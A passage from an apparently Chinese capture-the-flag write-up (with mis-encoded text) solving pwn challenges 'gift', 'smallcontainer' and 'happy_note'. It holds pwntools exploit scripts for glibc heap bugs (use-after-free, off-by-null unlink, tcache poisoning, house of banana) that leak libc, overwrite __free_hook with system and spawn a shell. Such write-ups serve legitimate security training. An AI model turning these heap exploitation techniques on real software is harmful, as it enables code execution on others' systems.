class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;123.56.45.214&#x27;,14822)</span></span><br><span class="line">p = process(<span class="string">&quot;./gift&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;gift&#x27;</span>)</span><br><span class="line">libc= elf.libc</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;choice:&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">t,content=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(t).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;gift!&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx).encode())    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">idx,num</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx).encode())  </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;How much?&#x27;</span>,<span class="built_in">str</span>(num).encode())   </span><br><span class="line"></span><br><span class="line">[add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]   <span class="comment">#0-4</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>))            <span class="comment">#5,include fake_chunk</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)                       <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">[delete(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#UAF edit chunk6_fd-&gt;fake_chunk</span></span><br><span class="line">backdoor(<span class="number">5</span>,-<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line"><span class="comment">#ç”±äºå‰é¢å·²ç»ä¿®æ”¹è¿‡fdï¼Œæ‰€ä»¥å†æ¬¡free chunk0ä¸ä¼šè§¦å‘æ£€æŸ¥</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;cost: &#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)) -<span class="number">0x10</span> -<span class="number">96</span> -libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#libc_base = int(p.recvuntil(b&#x27;\n&#x27;))-0x3ebca0</span></span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b malloc\nb free\nb realloc\nb calloc\nc&#x27;)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#ç”³è¯·å›chunk5,ä¿®æ”¹å…¶ä¸­fake_chunk_fd</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(free_hook-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;z&#x27;</span>*<span class="number">8</span>)   <span class="comment">#chunk5,idx=7</span></span><br><span class="line"><span class="comment">#ä»fake_chunkå¼€å§‹å¡«å……ï¼Œä¿®æ”¹chunk6_content</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)            <span class="comment">#fake_chunk,idx=8</span></span><br><span class="line">add(<span class="number">1</span>,p64(system))                                           <span class="comment">#free_hook,idx=9</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><hr><h3 id="2-smallcontainer"><a href="#2-smallcontainer" class="headerlink" title="2.smallcontainer"></a>2.smallcontainer</h3><h4 id="2-1-é€†å‘åˆ†æ"><a href="#2-1-é€†å‘åˆ†æ" class="headerlink" title="2.1 é€†å‘åˆ†æ"></a>2.1 é€†å‘åˆ†æ</h4><p>åœ¨editåŠŸèƒ½ä¸­æœ‰<code>off-by-null</code>æ¼æ´ï¼Œæ³¨æ„æœ€åè°ƒç”¨çš„<code>check</code>å‡½æ•°ä¸­ä¼šå°†å †å—å†…å®¹ä¸­çš„<code>\x11</code>å­—èŠ‚æ›¿æ¢ä¸ºç©ºå­—èŠ‚ï¼Œå› ä¸ºæ²¡æœ‰ç©ºå­—èŠ‚æˆªæ–­å­—ç¬¦ä¸²ï¼Œå¦‚æœé€šè¿‡å¤ç”¨<code>prev_size</code>çš„æ–¹å¼è®©å †å—å†…å®¹åŒºä¸ä¸‹ä¸€ä¸ªå †å—çš„<code>size</code>äº§ç”Ÿæ•°æ®ç²˜è¿ï¼Œé‚£ä¹ˆ<code>check</code>çš„æ—¶å€™å°±ä¼šæ›¿æ¢åˆ°ä¸‹ä¸ªå †å—çš„<code>size</code>ï¼Œå¯ä»¥ç”¨æ¥ç½®ç©º<code>inuse</code>ä½è¿›è¡Œ<code>unlink</code></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818140658151.png"></p><p>åŒæ—¶æ³¨æ„åœ¨<code>add</code>åŠŸèƒ½ä¸­å¯¹<code>size</code>åšå‡ºä¸€å®šé™åˆ¶ï¼Œä¸åŒäºæ™®é€š<code>off-by-null</code>çš„é¢˜ç›®ï¼Œè¿™é‡Œéœ€è¦å…ˆå¡«å……<code>tcache</code>æ‰èƒ½è¿›å…¥<code>unsorted_bin</code></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818141149317.png"></p><h4 id="2-2-è§£é¢˜"><a href="#2-2-è§£é¢˜" class="headerlink" title="2.2 è§£é¢˜"></a>2.2 è§£é¢˜</h4><p>é¦–å…ˆè¿›è¡Œå †å—çš„å¸ƒå±€ï¼Œè§£é‡Šä¸€ä¸‹ç›®çš„ï¼Œé¦–å…ˆç”³è¯·7ä¸ªå †å—ç”¨äºå¡«å……<code>tcache</code>é“¾ï¼Œæ²¡æœ‰å…¶ä»–ä½œç”¨ï¼Œç„¶åé€šè¿‡<code>chunk8</code>æ¥è¿›è¡Œ<code>off-by-null</code>æ¸…ç©º<code>chunk9_size</code>ä¸­çš„<code>inuse</code>ä½ï¼Œç„¶ååˆ é™¤<code>chunk9</code>è¿›è¡Œ<code>unlink</code>ï¼Œåˆå¹¶<code>chunk7</code>å’Œ<code>chunk8</code>ï¼Œé€šè¿‡<code>chunk8</code>çš„å †å—é‡å æ¥è¿›è¡Œ<code>tcache_poisoning</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[add(<span class="number">0x1f0</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">add(<span class="number">0x1f0</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x200</span>)<span class="comment">#9,target</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#10,é˜²æ­¢åˆå¹¶</span></span><br><span class="line">[delete(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">delete(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p><code>unlink</code>ï¼Œæ³¨æ„è¿™é‡Œ<code>edit</code>ä¸¤æ¬¡<code>chunk8</code>ï¼Œç¬¬ä¸€æ¬¡æ˜¯æ¸…ç©º<code>chunk9_size</code>ä¸­çš„<code>inuse</code>ä½</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143016604.png"></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143059845.png"></p><p>ç¬¬äºŒæ¬¡æ˜¯è®¾ç½®<code>chunk9_prev_size</code>ä½çš„å€¼ä¸º<code>chunk7_size+chunk8_size</code></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143210257.png"></p><p>åˆ é™¤<code>chunk9</code>è§¦å‘<code>unlink</code>ï¼ŒåŒæ—¶ç”±äº<code>off-by-null</code>æ˜¯å°†<code>\x11</code>å­—èŠ‚æ›¿æ¢ä¸ºç©ºå­—èŠ‚ï¼Œæ‰€ä»¥<code>chunk9_size</code>å°±ä¼šå‡å°‘<code>0x10</code>ï¼Œåœ¨<code>chunk9_content</code>æœ€åè¡¥ä¸ª<code>fake_chunk_header</code>ï¼Œå‡è£…åŒ…å«äº†<code>chunk10</code>æ¥é…åˆæ£€æŸ¥</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143313390.png"></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143339589.png"></p><p><code>chunk7ã€8ã€9</code>åˆå¹¶ä¸ºä¸€ä¸ªå¤§çš„<code>unsorted bin</code>ï¼Œæ­¤æ—¶è¿™ä¸ª<code>unsorted bin</code>å°±ä¸<code>chunk8</code>å­˜åœ¨å †é‡å <br>æ•ˆæœå›¾ï¼š</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143501639.png"></p><p>ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#unlink</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0x310</span>))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x121</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><p>ç”±äºå †å—ç”³è¯·æ²¡æœ‰è¿›è¡Œåˆå§‹åŒ–ï¼Œé€šè¿‡<code>unsorted_bin</code>æ®‹ç•™çš„æŒ‡é’ˆæ¥æ³„éœ²libcï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹ç”³è¯·çš„å¤§å°æ˜¯<code>0x1d0</code>ï¼Œå› ä¸ºä¸èƒ½ä¸åˆšå¼€å§‹ç”¨æ¥å¡«å……<code>tcache</code>é“¾çš„å †å—<code>size</code>ç›¸åŒï¼Œå¦åˆ™å°±ä¸ä¼šä»<code>unsorted_bin</code>åˆ‡å‰²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x1d0</span>)<span class="comment">#7,idx=0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;This&#x27;</span>,drop=<span class="number">1</span>),<span class="number">16</span>)-<span class="number">0x3ec0d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å †é‡å æ§åˆ¶<code>tcache_fd</code>æ‰“<code>free_hook</code>ï¼Œæˆ‘ä»¬ç”³è¯·<code>0x320</code>å¤§å°çš„å †å—(<code>idx=1</code>)ï¼Œä¼šè·å¾—å‰©ä½™çš„å…¨éƒ¨<code>unsorted_bin</code>ï¼Œç°åœ¨çš„<code>chunk1</code>åŒ…å«äº†æ•´ä¸ª<code>chunk8</code>ï¼Œæ‰€ä»¥å…ˆåˆ é™¤<code>chunk8</code>è¿›å…¥<code>tcache_0x110</code>é“¾ä¸­ï¼Œç„¶åä¿®æ”¹<code>chunk8_fd</code>ä¸º<code>free_hook-0x8</code>çš„ä½ç½®ï¼Œç›´æ¥åœ¨<code>free_hook</code>å‰å¡«å……<code>/bin/sh\x00</code>å­—ç¬¦ï¼Œç„¶ååˆ é™¤<code>free_hook</code>è¿™ä¸ªå †å—æ¥<code>getshell</code>ï¼Œä¿®æ”¹<code>fd</code>çš„æ—¶å€™è¦æ³¨æ„ï¼Œåˆšåˆšåˆ‡å‰²åŸ<code>chunk7</code>çš„æ—¶å€™è¿˜å‰©ä¸‹<code>0x10</code>æ²¡åˆ†é…ï¼Œæ‰€ä»¥ç°åœ¨å…ˆå¡«å……<code>0x10</code>ä¸ªå­—ç¬¦æ‰åˆ°<code>chunk8_header</code></p><p>æ­¤æ—¶<code>tcache</code>é“¾è¡¨çŠ¶æ€ï¼š</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818144700149.png"></p><p>æ­¤æ—¶ç”³è¯·ä¸€ä¸ªå †å—ä¼šé‡æ–°è·å¾—åŸhunk8ï¼Œå†ç”³è¯·å°±è·å¾—<code>free_hook-0x8</code>ï¼Œå¾€é‡Œå†™å…¥<code>/bin/sh</code>å­—ç¬¦ä¸²å¹¶ä¿®æ”¹<code>free_hook</code>ä¸º<code>system</code>ï¼Œæœ€ååˆ é™¤è‡ªèº«<code>getshell</code></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818145215324.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk overlap</span></span><br><span class="line">add(<span class="number">0x320</span>)<span class="comment">#8,idx=1</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(free_hook-<span class="number">0x8</span>))</span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#8,idx=2</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#free_hook,idx=3</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>æœ€åï¼š</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818145302005.png"></p><hr><h3 id="3-happy-note"><a href="#3-happy-note" class="headerlink" title="3.happy_note"></a>3.happy_note</h3><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818145855828.png"></p><p>è¿™é“é¢˜åœ¨ç¬¬äºŒå¤©æ—©ä¸Šæ‰è§£å‡ºæ¥ï¼Œä¸»è¦æ˜¯gifté‚£é“é¢˜æƒ³äº†æ¯”è¾ƒä¹…ï¼Œæœ‰ç‚¹å¯æƒœ</p><p>è¿™é“é¢˜æˆ‘çš„è§£æ³•æ˜¯<code>tcache_poisioning+house_of_banana</code>ï¼Œå’Œæ™®é€šçš„<code>house_of_banana</code>æ”»å‡»ä¸åŒï¼Œè¿™é¢˜ä¸èƒ½ç”³è¯·<code>largebin</code>å¤§å°çš„å †å—è‡ªç„¶ä¹Ÿæ— æ³•å…ˆè¿›è¡Œ<code>largebin_attack</code>ï¼Œè€Œæ˜¯ç•™ä¸‹äº†<code>UAF</code>çš„<code>backdoor</code>é€šè¿‡<code>tcache_fd</code>æ¥æ”»å‡»<code>_rtld_global</code>ç»“æ„ä½“ä¸­çš„<code>link_map</code>é“¾è¡¨</p><blockquote><p><em>å…³äºhouse_of_bananaæˆ‘åªç®€å•æä¸€ä¸‹ï¼Œhouse of banana æ˜¯ha1vkå¸ˆå‚…åœ¨2020å¹´æ€»ç»“å‡ºæ¥çš„åˆ©ç”¨é“¾ã€‚ä¸åŒäºIO_str_finishå’ŒIO_str_overflowåˆ©ç”¨ï¼Œbananaæ”»å‡»çš„æ˜¯rtld_globalç»“æ„ä½“ä¸­çš„link_mapé“¾è¡¨ï¼Œå¤§å¤šæ•°å¸ˆå‚…å¯¹äºbananaçš„æ”»å‡»æ–¹å¼ä¸»è¦æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯æ”»å‡»rtld_globalè¿™ä¸ªå…¨å±€ç¬¦å·æ‰€ä¿å­˜çš„link_mapçš„é“¾è¡¨ï¼Œä¼ªé€ æ•´ä¸ªé“¾è¡¨ï¼Œè¿›è¡ŒåŠ«æŒï¼›å¦å¤–ä¸€ä¸ªä¸ä¹‹ç›¸æ¯”ç ´åæ€§æ¯”è¾ƒå°ï¼Œæ›´å®¹æ˜“æˆåŠŸã€‚ç”±äºlink_mapé€šè¿‡é“¾è¡¨é“¾æ¥ï¼Œä½†æ˜¯åœ¨åŠ è½½exitçš„æ—¶å€™ï¼Œç›¸å…³å‡½æ•°æ™ºæ…§é€šè¿‡link_map-&gt;l_nextæŒ‡é’ˆè¿›è¡Œç›¸å…³çš„æ£€æŸ¥ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æŸä¸ªç‰¹å®šçš„ä½ç½®ï¼Œæ›´æ”¹nextæŒ‡é’ˆï¼Œå°†ä¸‹ä¸€ä»¥é“¾è¡¨èŠ‚ç‚¹è½¬ä¸ºæˆ‘ä»¬æ§åˆ¶çš„åœ°æ–¹ï¼Œæ¯”å¦‚heapä¸Šã€‚è§¦å‘æ–¹å¼è¦ä¹ˆæ˜¯èƒ½å¤Ÿæ˜¾å¼çš„æ‰§è¡Œ exit å‡½æ•°ï¼Œè¦ä¹ˆæ˜¯ç¨‹åºé€šè¿‡ libc_start_main å¯åŠ¨çš„ä¸»å‡½æ•°ï¼Œä¸”ä¸»å‡½æ•°èƒ½å¤Ÿç»“æŸ</em></p></blockquote><p>æˆ‘æ˜¯åœ¨åé¢åšé¢˜æ‰“<code>IO_FILE</code>çš„æ—¶å€™å‘ç°æ— æ³•å†™å…¥ï¼Œè¿™æ‰å»æŸ¥äº†é¢˜ç›®çš„libcç‰ˆæœ¬æ˜¯<code>2.34-0ubuntu3.2</code>ï¼Œ<code>IO_FILE</code>å’Œ<code>exit_hook</code>éƒ½å·²ç»æ²¡æœ‰å†™å…¥æƒé™ï¼Œæ‰€ä»¥æ‰ä½¿ç”¨<code>house_of_banana</code>ï¼Œåˆšå¼€å§‹æ˜¯ç”¨äº†ç¬¬ä¸€ç§æ–¹æ³•ä½†æ˜¯æ²¡æˆåŠŸï¼Œæ‰€ä»¥è¿™é‡Œç”¨çš„æ˜¯æ–¹æ³•äºŒã€‚ç”±äºhouse_of_bananaæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å®è·µï¼Œæ‰€ä»¥å…·ä½“ç»†èŠ‚çš„è¯è¿˜æ˜¯è´´å‡ºæˆ‘å­¦ä¹ çš„æ–‡ç« ï¼Œå¤§å®¶è‡ªè¡Œäº†è§£ï¼Œæˆ‘è¿™é‡Œåªå…·ä½“è¯´æ„é€ payloadçš„éƒ¨åˆ†</p><p>å‚è€ƒæ–‡ç« ï¼š</p><blockquote><p>house of banana - <a href="https://www.anquanke.com/post/id/222948?display=mobile">https://www.anquanke.com/post/id/222948?display=mobile</a></p><p>é«˜ç‰ˆæœ¬glibcå †çš„å‡ ç§åˆ©ç”¨æ‰‹æ³• - <a href="https://zhuanlan.zhihu.com/p/535469996">https://zhuanlan.zhihu.com/p/535469996</a></p><p>house of banana é€šç”¨ exp - <a href="https://www.mrskye.cn/archives/8b3b5c42/">https://www.mrskye.cn/archives/8b3b5c42/</a></p></blockquote><h4 id="3-1-é€†å‘åˆ†æ"><a href="#3-1-é€†å‘åˆ†æ" class="headerlink" title="3.1 é€†å‘åˆ†æ"></a>3.1 é€†å‘åˆ†æ</h4><p>å”¯ä¸€çš„æ¼æ´ç‚¹æ˜¯æœ‰ä¸€ä¸ªéšè—é€‰é¡¹666ï¼Œç•™äº†ä¸€ä¸ªåªèƒ½ä½¿ç”¨ä¸€æ¬¡çš„åé—¨ï¼Œå¯ä»¥å®ç°UAF</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818151133392.png"></p><h4 id="3-2-è§£é¢˜"><a href="#3-2-è§£é¢˜" class="headerlink" title="3.2 è§£é¢˜"></a>3.2 è§£é¢˜</h4><p>å †å¸ƒå±€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[add(x,0x200,1) for x in range(8)]#0-7</span><br><span class="line">add(8,0x1e0,1)#8</span><br></pre></td></tr></table></figure><p>æŠŠåˆšå¼€å§‹ç”³è¯·çš„<code>8ä¸ª0x200</code>çš„å †å—éƒ½<code>free</code>æ‰ï¼Œå‰7ä¸ªå¡«å……<code>tcache</code>ï¼Œç¬¬8ä¸ªè¿›å…¥<code>unsorted bin</code>ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç”¨<code>backdoor</code>åŠŸèƒ½åˆ é™¤<code>chunk7</code>ï¼Œä¹‹åæˆ‘ä»¬ä¼šåå¤åˆ©ç”¨è¿™ä¸ª<code>UAF</code>çš„æŒ‡é’ˆï¼Œå› ä¸º<code>backdoor</code>åªèƒ½ç”¨ä¸€æ¬¡ï¼Œè¿›å…¥<code>unsorted bin</code>åé€šè¿‡<code>UAF</code>æ³„éœ²<code>libc</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">[delete(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">backdoor(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219cc0</span></span><br><span class="line">padding = libc_base + <span class="number">0x218bc0</span></span><br><span class="line">l_next = libc_base + <span class="number">0x228088</span> - <span class="number">0x8</span></span><br><span class="line">rtl_global = libc_base + <span class="number">0x266040</span></span><br><span class="line">one_gadget = libc_base + one[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;l_next&#x27;</span>,<span class="built_in">hex</span>(l_next))</span><br></pre></td></tr></table></figure><p>ç”±äºé«˜ç‰ˆæœ¬çš„<code>tcache</code>å­˜åœ¨<code>key</code>å¼‚æˆ–åŠ å¯†ï¼ˆå…·ä½“çš„è‡ªè¡Œæœç´¢é«˜ç‰ˆæœ¬<code>tcache</code>çš„åˆ©ç”¨éƒ½ä¼šå‘ç°ï¼Œè¿™é‡Œå°±ä¸å±•å¼€æäº†ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå°†<code>unsorted_bin</code>åˆ‡å‰²ä¸€å°å—ç”¨äºæ³„éœ²<code>key</code>åŒæ—¶ä¹Ÿè·å¾—å †åœ°å€ï¼ˆé€šè¿‡<code>UAF</code>çš„<code>chunk7</code>æŒ‡é’ˆï¼‰ï¼Œè¿™é‡Œçš„<code>heap</code>æ˜¯ä¹‹å<code>house_of_banana</code>è¿‡ç¨‹ä¸­<code>chunk1</code>çš„å †å¤´éƒ¨åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak tcache_key</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="number">1</span>)<span class="comment">#7,idx=9</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap = (key&lt;&lt;<span class="number">12</span>)+<span class="number">0x500</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key&#x27;</span>,<span class="built_in">hex</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span 